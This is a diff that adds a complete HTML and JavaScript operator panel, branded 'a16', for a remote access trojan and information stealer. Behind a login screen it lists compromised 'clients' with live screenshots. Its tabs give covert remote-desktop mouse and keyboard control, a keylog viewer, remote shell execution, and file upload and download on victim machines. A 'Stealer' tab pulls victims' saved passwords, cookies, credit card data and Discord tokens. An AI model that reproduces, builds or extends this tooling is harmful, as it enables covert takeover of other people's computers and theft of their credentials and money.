@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>a16</title>
+    <style>
+        /* ---------- Reset & base ---------- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Helvetica Neue', sans-serif; }
+        body { background: #1a1a1a; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        /* ---------- Startup screen (Mac-like) ---------- */
+        #startup {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(145deg, #3a3a3a 0%, #1a1a1a 100%);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 1000; transition: opacity 0.8s ease;
+        }
+        #startup.hidden { opacity: 0; pointer-events: none; }
+        .logo-container {
+            width: 736px; height: 736px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            grid-template-rows: repeat(4, 1fr);
+            gap: 12px;
+            background: #222;
+            border-radius: 32px;
+            padding: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .logo-container:hover { transform: scale(1.02); }
+        .logo-cell {
+            background: #333;
+            border-radius: 16px;
+            transition: background 0.3s;
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-size: 2rem; font-weight: 600;
+            border: 1px solid #444;
+        }
+        .logo-cell:nth-child(1) { background: #2a2a2a; }
+        .logo-cell:nth-child(2) { background: #3a3a3a; }
+        .logo-cell:nth-child(3) { background: #2a2a2a; }
+        .logo-cell:nth-child(4) { background: #3a3a3a; }
+        /* pattern */
+        .logo-cell:nth-child(5) { background: #3a3a3a; }
+        .logo-cell:nth-child(6) { background: #2a2a2a; }
+        .logo-cell:nth-child(7) { background: #3a3a3a; }
+        .logo-cell:nth-child(8) { background: #2a2a2a; }
+        .logo-cell:nth-child(9) { background: #2a2a2a; }
+        .logo-cell:nth-child(10) { background: #3a3a3a; }
+        .logo-cell:nth-child(11) { background: #2a2a2a; }
+        .logo-cell:nth-child(12) { background: #3a3a3a; }
+        .logo-cell:nth-child(13) { background: #3a3a3a; }
+        .logo-cell:nth-child(14) { background: #2a2a2a; }
+        .logo-cell:nth-child(15) { background: #3a3a3a; }
+        .logo-cell:nth-child(16) { background: #2a2a2a; }
+        .logo-text {
+            position: absolute; bottom: 120px; color: rgba(255,255,255,0.15);
+            font-size: 4rem; font-weight: 100; letter-spacing: 12px;
+        }
+        /* ---------- Login overlay ---------- */
+        #login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(12px);
+            display: none;
+            align-items: center; justify-content: center;
+            z-index: 2000;
+        }
+        #login-overlay.active { display: flex; }
+        .login-box {
+            background: #222; padding: 40px; border-radius: 24px;
+            width: 340px; box-shadow: 0 24px 48px rgba(0,0,0,0.8);
+            border: 1px solid #444;
+        }
+        .login-box h2 { color: #eee; margin-bottom: 24px; text-align: center; font-weight: 300; letter-spacing: 2px; }
+        .login-box input {
+            width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px;
+            border: 1px solid #555; background: #1a1a1a; color: #eee; font-size: 1rem;
+        }
+        .login-box button {
+            width: 100%; padding: 12px; margin-top: 16px; border: none;
+            background: #3a3a3a; color: white; border-radius: 12px; font-size: 1rem;
+            cursor: pointer; transition: background 0.2s;
+        }
+        .login-box button:hover { background: #555; }
+        .login-error { color: #ff6b6b; margin-top: 12px; text-align: center; display: none; }
+        /* ---------- Dashboard ---------- */
+        #dashboard {
+            display: none;
+            width: 100%; height: 100vh;
+            padding: 20px;
+            background: #1a1a1a;
+            overflow-y: auto;
+        }
+        #dashboard.active { display: block; }
+        .dashboard-header {
+            color: #aaa; font-size: 1.2rem; padding: 12px 0;
+            border-bottom: 1px solid #333; margin-bottom: 24px;
+            display: flex; justify-content: space-between;
+        }
+        .client-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+        .client-card {
+            background: #222; border-radius: 16px; padding: 16px;
+            border: 1px solid #333; transition: border 0.2s; cursor: pointer;
+        }
+        .client-card:hover { border-color: #666; }
+        .client-card .preview {
+            width: 100%; aspect-ratio: 16/9;
+            background: #0a0a0a; border-radius: 8px; overflow: hidden;
+            display: flex; align-items: center; justify-content: center;
+            color: #444; font-size: 0.8rem;
+        }
+        .client-card .preview img { width: 100%; height: 100%; object-fit: cover; }
+        .client-card .info {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-top: 12px;
+        }
+        .client-card .name { color: #eee; font-weight: 500; }
+        .client-card .status { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .status.online { background: #4caf50; }
+        .status.offline { background: #f44336; }
+        /* ---------- Detail view (modal) ---------- */
+        #detail-view {
+            display: none;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 3000;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        #detail-view.active { display: block; }
+        .detail-container {
+            max-width: 1200px; margin: 0 auto;
+            background: #1a1a1a; border-radius: 16px; padding: 24px;
+            border: 1px solid #333;
+            color: #ccc;
+        }
+        .detail-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 16px;
+        }
+        .detail-header h2 { color: #eee; font-weight: 300; }
+        .close-btn { background: none; border: none; color: #888; font-size: 2rem; cursor: pointer; }
+        .close-btn:hover { color: #fff; }
+        .detail-tabs {
+            display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap;
+        }
+        .detail-tabs button {
+            background: #2a2a2a; border: none; color: #aaa; padding: 8px 16px;
+            border-radius: 8px; cursor: pointer; transition: 0.2s;
+        }
+        .detail-tabs button.active { background: #444; color: #fff; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        /* RDP canvas */
+        #rdp-canvas { width: 100%; background: #000; border-radius: 8px; cursor: crosshair; }
+        .rdp-controls { display: flex; gap: 12px; margin: 12px 0; flex-wrap: wrap; }
+        .rdp-controls button {
+            background: #2a2a2a; border: 1px solid #444; color: #ccc;
+            padding: 6px 16px; border-radius: 8px; cursor: pointer;
+        }
+        .rdp-controls button.active { background: #4caf50; border-color: #4caf50; color: #fff; }
+        /* Shell & keylog */
+        #shell-output {
+            background: #0a0a0a; padding: 12px; border-radius: 8px;
+            min-height: 200px; max-height: 400px; overflow-y: auto;
+            font-family: monospace; white-space: pre-wrap; color: #0f0;
+            border: 1px solid #333;
+        }
+        #shell-input { width: 100%; padding: 8px; background: #222; border: 1px solid #444; color: #eee; border-radius: 8px; }
+        .file-browser { display: flex; gap: 8px; margin-bottom: 8px; }
+        .file-browser input { flex: 1; padding: 8px; background: #222; border: 1px solid #444; color: #eee; border-radius: 8px; }
+        .file-list { background: #0a0a0a; padding: 8px; border-radius: 8px; max-height: 300px; overflow-y: auto; }
+        .file-item { padding: 4px 8px; border-bottom: 1px solid #222; cursor: pointer; }
+        .file-item:hover { background: #2a2a2a; }
+        .stealer-actions button {
+            margin: 4px; background: #2a2a2a; border: 1px solid #444; color: #ccc;
+            padding: 8px 16px; border-radius: 8px; cursor: pointer;
+        }
+        .stealer-actions button:hover { background: #444; }
+        #stealer-output { background: #0a0a0a; padding: 12px; border-radius: 8px; max-height: 400px; overflow-y: auto; font-family: monospace; white-space: pre-wrap; color: #0f0; border: 1px solid #333; margin-top: 12px; }
+    </style>
+</head>
+<body>
+    <!-- Startup Screen -->
+    <div id="startup">
+        <div class="logo-container" id="logo-btn">
+            <div class="logo-cell">a</div><div class="logo-cell">1</div><div class="logo-cell">6</div><div class="logo-cell">⚡</div>
+            <div class="logo-cell">■</div><div class="logo-cell">●</div><div class="logo-cell">▲</div><div class="logo-cell">◆</div>
+            <div class="logo-cell">◆</div><div class="logo-cell">▲</div><div class="logo-cell">●</div><div class="logo-cell">■</div>
+            <div class="logo-cell">⚡</div><div class="logo-cell">6</div><div class="logo-cell">1</div><div class="logo-cell">a</div>
+        </div>
+        <div class="logo-text">a16</div>
+    </div>
+
+    <!-- Login Overlay -->
+    <div id="login-overlay">
+        <div class="login-box">
+            <h2>a16</h2>
+            <input type="text" id="login-user" placeholder="username" />
+            <input type="password" id="login-pass" placeholder="password" />
+            <button id="login-btn">Enter</button>
+            <div class="login-error" id="login-error">Invalid credentials</div>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard">
+        <div class="dashboard-header">
+            <span>a16 · Control Panel</span>
+            <span id="client-count">0 clients</span>
+        </div>
+        <div class="client-grid" id="client-grid"></div>
+    </div>
+
+    <!-- Detail View (modal) -->
+    <div id="detail-view">
+        <div class="detail-container">
+            <div class="detail-header">
+                <h2 id="detail-title">Client</h2>
+                <button class="close-btn" id="close-detail">✕</button>
+            </div>
+            <div class="detail-tabs">
+                <button class="active" data-tab="rdp">RDP</button>
+                <button data-tab="keylog">Keylog</button>
+                <button data-tab="shell">Shell</button>
+                <button data-tab="files">Files</button>
+                <button data-tab="stealer">Stealer</button>
+            </div>
+            <!-- RDP Tab -->
+            <div class="tab-content active" id="tab-rdp">
+                <canvas id="rdp-canvas" width="800" height="450"></canvas>
+                <div class="rdp-controls">
+                    <button id="mouse-toggle" class="active">🖱️ Mouse ON</button>
+                    <button id="keyboard-toggle" class="active">⌨️ Keyboard ON</button>
+                    <input type="text" id="keyboard-input" placeholder="Type here (sends keys)" style="flex:1; background:#222; border:1px solid #444; color:#eee; padding:6px; border-radius:8px;" />
+                </div>
+            </div>
+            <!-- Keylog Tab -->
+            <div class="tab-content" id="tab-keylog">
+                <div id="keylog-display" style="background:#0a0a0a; padding:12px; border-radius:8px; min-height:200px; font-family:monospace; color:#0f0; border:1px solid #333; white-space:pre-wrap;"></div>
+                <button id="clear-keylog" style="margin-top:8px; background:#2a2a2a; border:1px solid #444; color:#ccc; padding:4px 16px; border-radius:8px;">Clear</button>
+            </div>
+            <!-- Shell Tab -->
+            <div class="tab-content" id="tab-shell">
+                <div id="shell-output">> Ready</div>
+                <input type="text" id="shell-input" placeholder="Enter command..." style="width:100%; margin-top:8px; padding:8px; background:#222; border:1px solid #444; color:#eee; border-radius:8px;" />
+            </div>
+            <!-- Files Tab -->
+            <div class="tab-content" id="tab-files">
+                <div class="file-browser">
+                    <input type="text" id="file-path" value="C:\\" placeholder="Path" />
+                    <button id="file-list-btn" style="background:#2a2a2a; border:1px solid #444; color:#ccc; padding:4px 16px; border-radius:8px;">List</button>
+                </div>
+                <div class="file-list" id="file-list"></div>
+                <div style="margin-top:8px; display:flex; gap:8px; flex-wrap:wrap;">
+                    <input type="file" id="file-upload" style="display:none;" />
+                    <button id="upload-btn" style="background:#2a2a2a; border:1px solid #444; color:#ccc; padding:4px 16px; border-radius:8px;">Upload</button>
+                    <button id="download-btn" style="background:#2a2a2a; border:1px solid #444; color:#ccc; padding:4px 16px; border-radius:8px;">Download Selected</button>
+                </div>
+            </div>
+            <!-- Stealer Tab -->
+            <div class="tab-content" id="tab-stealer">
+                <div class="stealer-actions">
+                    <button data-action="passwords">📧 Passwords</button>
+                    <button data-action="cookies">🍪 Cookies</button>
+                    <button data-action="creditcards">💳 Credit Cards</button>
+                    <button data-action="discord">🎮 Discord Tokens</button>
+                    <button data-action="all">📦 All</button>
+                </div>
+                <div id="stealer-output">Stealer output will appear here...</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // ---------- State ----------
+        let selectedGuid = null;
+        let mouseEnabled = true;
+        let keyboardEnabled = true;
+        let currentRequestId = 0;
+        const socket = io();
+
+        // ---------- DOM refs ----------
+        const startup = document.getElementById('startup');
+        const loginOverlay = document.getElementById('login-overlay');
+        const dashboard = document.getElementById('dashboard');
+        const clientGrid = document.getElementById('client-grid');
+        const detailView = document.getElementById('detail-view');
+        const rdpCanvas = document.getElementById('rdp-canvas');
+        const ctx = rdpCanvas.getContext('2d');
+        const keylogDisplay = document.getElementById('keylog-display');
+        const shellOutput = document.getElementById('shell-output');
+        const shellInput = document.getElementById('shell-input');
+        const fileList = document.getElementById('file-list');
+        const filePath = document.getElementById('file-path');
+        const stealerOutput = document.getElementById('stealer-output');
+        const detailTitle = document.getElementById('detail-title');
+
+        // ---------- Auth ----------
+        document.getElementById('logo-btn').addEventListener('click', () => {
+            loginOverlay.classList.add('active');
+        });
+
+        document.getElementById('login-btn').addEventListener('click', async () => {
+            const user = document.getElementById('login-user').value;
+            const pass = document.getElementById('login-pass').value;
+            const res = await fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: user, password: pass })
+            });
+            const json = await res.json();
+            if (json.success) {
+                loginOverlay.classList.remove('active');
+                startup.classList.add('hidden');
+                dashboard.classList.add('active');
+                loadClients();
+            } else {
+                document.getElementById('login-error').style.display = 'block';
+            }
+        });
+
+        // Enter key for login
+        document.getElementById('login-pass').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('login-btn').click();
+        });
+
+        // ---------- Socket events ----------
+        socket.on('client_list', (list) => {
+            renderClients(list);
+        });
+
+        socket.on('client_update', (update) => {
+            // Update specific card
+            const card = document.querySelector(`.client-card[data-guid="${update.guid}"]`);
+            if (card) {
+                const img = card.querySelector('.preview img');
+                if (update.screenshot) img.src = update.screenshot;
+                const statusDot = card.querySelector('.status');
+                if (update.status) {
+                    statusDot.className = 'status ' + (update.status === 'online' ? 'online' : 'offline');
+                }
+                if (update.lastSeen) {
+                    card.querySelector('.last-seen').textContent = new Date(update.lastSeen).toLocaleTimeString();
+                }
+            }
+        });
+
+        socket.on('command_response', (data) => {
+            const { requestId, result, error } = data;
+            // Route to appropriate UI
+            if (error) {
+                appendShell(`[Error] ${error}`);
+                return;
+            }
+            // Check if it's for shell
+            if (result && result.type === 'shell') {
+                appendShell(result.output);
+            } else if (result && result.type === 'keylog') {
+                keylogDisplay.textContent += result.data;
+            } else if (result && result.type === 'file_list') {
+                renderFileList(result.files);
+            } else if (result && result.type === 'stealer') {
+                stealerOutput.textContent = result.data;
+            } else if (result && result.type === 'download') {
+                // Trigger download
+                const a = document.createElement('a');
+                a.href = 'data:application/octet-stream;base64,' + result.fileData;
+                a.download = result.filename;
+                a.click();
+            } else {
+                stealerOutput.textContent = JSON.stringify(result, null, 2);
+            }
+        });
+
+        // ---------- Render clients ----------
+        function renderClients(list) {
+            clientGrid.innerHTML = '';
+            list.forEach(client => {
+                const card = document.createElement('div');
+                card.className = 'client-card';
+                card.dataset.guid = client.guid;
+                card.innerHTML = `
+                    <div class="preview">
+                        <img src="${client.screenshot || ''}" alt="preview" style="${client.screenshot ? '' : 'display:none;'}" />
+                    </div>
+                    <div class="info">
+                        <span class="name">${client.hostname || 'Unknown'}</span>
+                        <div>
+                            <span class="status ${client.status === 'online' ? 'online' : 'offline'}"></span>
+                            <span class="last-seen" style="color:#666; font-size:0.7rem; margin-left:8px;">${client.lastSeen ? new Date(client.lastSeen).toLocaleTimeString() : ''}</span>
+                        </div>
+                    </div>
+                `;
+                card.addEventListener('click', () => openDetail(client.guid));
+                clientGrid.appendChild(card);
+            });
+            document.getElementById('client-count').textContent = list.length + ' clients';
+        }
+
+        function loadClients() {
+            socket.emit('get_clients'); // Server should send client_list on connect; we already handle it.
+        }
+
+        // ---------- Detail view ----------
+        function openDetail(guid) {
+            selectedGuid = guid;
+            detailTitle.textContent = 'Client: ' + guid;
+            detailView.classList.add('active');
+            // Reset tabs
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.detail-tabs button').forEach(b => b.classList.remove('active'));
+            document.getElementById('tab-rdp').classList.add('active');
+            document.querySelector('.detail-tabs button[data-tab="rdp"]').classList.add('active');
+            // Request initial screenshot
+            sendCommand('screen_start', {});
+            // Request keylog state
+            sendCommand('keylog_get', {});
+        }
+
+        document.getElementById('close-detail').addEventListener('click', () => {
+            detailView.classList.remove('active');
+            selectedGuid = null;
+            sendCommand('screen_stop', {});
+        });
+
+        // ---------- Tab switching ----------
+        document.querySelectorAll('.detail-tabs button').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.detail-tabs button').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+                document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+                if (btn.dataset.tab === 'files') {
+                    listFiles(filePath.value);
+                }
+            });
+        });
+
+        // ---------- RDP ----------
+        // Mouse events on canvas
+        rdpCanvas.addEventListener('mousemove', (e) => {
+            if (!mouseEnabled || !selectedGuid) return;
+            const rect = rdpCanvas.getBoundingClientRect();
+            const scaleX = rdpCanvas.width / rect.width;
+            const scaleY = rdpCanvas.height / rect.height;
+            const x = Math.round((e.clientX - rect.left) * scaleX);
+            const y = Math.round((e.clientY - rect.top) * scaleY);
+            sendCommand('mouse_move', { x, y });
+        });
+
+        rdpCanvas.addEventListener('click', (e) => {
+            if (!mouseEnabled || !selectedGuid) return;
+            const rect = rdpCanvas.getBoundingClientRect();
+            const scaleX = rdpCanvas.width / rect.width;
+            const scaleY = rdpCanvas.height / rect.height;
+            const x = Math.round((e.clientX - rect.left) * scaleX);
+            const y = Math.round((e.clientY - rect.top) * scaleY);
+            sendCommand('mouse_click', { x, y, button: 'left' });
+        });
+
+        rdpCanvas.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            if (!mouseEnabled || !selectedGuid) return;
+            const rect = rdpCanvas.getBoundingClientRect();
+            const scaleX = rdpCanvas.width / rect.width;
+            const scaleY = rdpCanvas.height / rect.height;
+            const x = Math.round((e.clientX - rect.left) * scaleX);
+            const y = Math.round((e.clientY - rect.top) * scaleY);
+            sendCommand('mouse_click', { x, y, button: 'right' });
+        });
+
+        // Keyboard input
+        document.getElementById('keyboard-input').addEventListener('keydown', (e) => {
+            if (!keyboardEnabled || !selectedGuid) return;
+            if (e.key === 'Enter') {
+                sendCommand('key_press', { key: 'enter' });
+                e.target.value = '';
+                e.preventDefault();
+            } else if (e.key === 'Backspace') {
+                sendCommand('key_press', { key: 'backspace' });
+                e.preventDefault();
+            } else if (e.key.length === 1) {
+                sendCommand('key_press', { key: e.key });
+            }
+        });
+
+        // Toggle buttons
+        document.getElementById('mouse-toggle').addEventListener('click', function() {
+            mouseEnabled = !mouseEnabled;
+            this.classList.toggle('active');
+            this.textContent = mouseEnabled ? '🖱️ Mouse ON' : '🖱️ Mouse OFF';
+        });
+        document.getElementById('keyboard-toggle').addEventListener('click', function() {
+            keyboardEnabled = !keyboardEnabled;
+            this.classList.toggle('active');
+            this.textContent = keyboardEnabled ? '⌨️ Keyboard ON' : '⌨️ Keyboard OFF';
+        });
+
+        // Update screenshot from socket
+        socket.on('screenshot_update', (data) => {
+            if (data.guid === selectedGuid && data.image) {
+                const img = new Image();
+                img.onload = () => {
+                    ctx.drawImage(img, 0, 0, rdpCanvas.width, rdpCanvas.height);
+                };
+                img.src = data.image;
+            }
+        });
+
+        // ---------- Shell ----------
+        shellInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const cmd = shellInput.value;
+                shellInput.value = '';
+                appendShell('> ' + cmd);
+                sendCommand('shell_exec', { command: cmd });
+            }
+        });
+
+        function appendShell(text) {
+            shellOutput.textContent += '\n' + text;
+            shellOutput.scrollTop = shellOutput.scrollHeight;
+        }
+
+        // ---------- Files ----------
+        document.getElementById('file-list-btn').addEventListener('click', () => listFiles(filePath.value));
+        document.getElementById('upload-btn').addEventListener('click', () => {
+            document.getElementById('file-upload').click();
+        });
+        document.getElementById('file-upload').addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                const base64 = ev.target.result.split(',')[1];
+                const path = filePath.value;
+                sendCommand('file_upload', { path: path + '\\' + file.name, data: base64 });
+            };
+            reader.readAsDataURL(file);
+            e.target.value = '';
+        });
+
+        document.getElementById('download-btn').addEventListener('click', () => {
+            const selected = document.querySelector('.file-item.selected');
+            if (selected) {
+                const fullPath = selected.dataset.fullpath;
+                sendCommand('file_download', { path: fullPath });
+            }
+        });
+
+        function listFiles(path) {
+            sendCommand('file_list', { path: path });
+        }
+
+        function renderFileList(files) {
+            fileList.innerHTML = '';
+            files.forEach(f => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                div.textContent = (f.isDir ? '📁 ' : '📄 ') + f.name;
+                div.dataset.fullpath = f.fullPath;
+                div.addEventListener('click', () => {
+                    document.querySelectorAll('.file-item').forEach(el => el.classList.remove('selected'));
+                    div.classList.add('selected');
+                    if (f.isDir) {
+                        filePath.value = f.fullPath;
+                        listFiles(f.fullPath);
+                    }
+                });
+                fileList.appendChild(div);
+            });
+        }
+
+        // ---------- Stealer ----------
+        document.querySelectorAll('.stealer-actions button').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const action = btn.dataset.action;
+                stealerOutput.textContent = 'Collecting ' + action + '...';
+                sendCommand('stealer', { action: action });
+            });
+        });
+
+        // ---------- Command sender ----------
+        function sendCommand(type, payload) {
+            if (!selectedGuid) return;
+            const requestId = ++currentRequestId;
+            socket.emit('command', {
+                guid: selectedGuid,
+                type: type,
+                payload: payload,
+                requestId: requestId
+            });
+        }
+
+        // ---------- Keylog clear ----------
+        document.getElementById('clear-keylog').addEventListener('click', () => {
+            keylogDisplay.textContent = '';
+        });
+
+        // ---------- Auto-reconnect ----------
+        socket.on('disconnect', () => {
+            console.warn('Disconnected from server');
+        });
+
+        console.log('a16 panel ready');
+    </script>
+</body>
+</html>
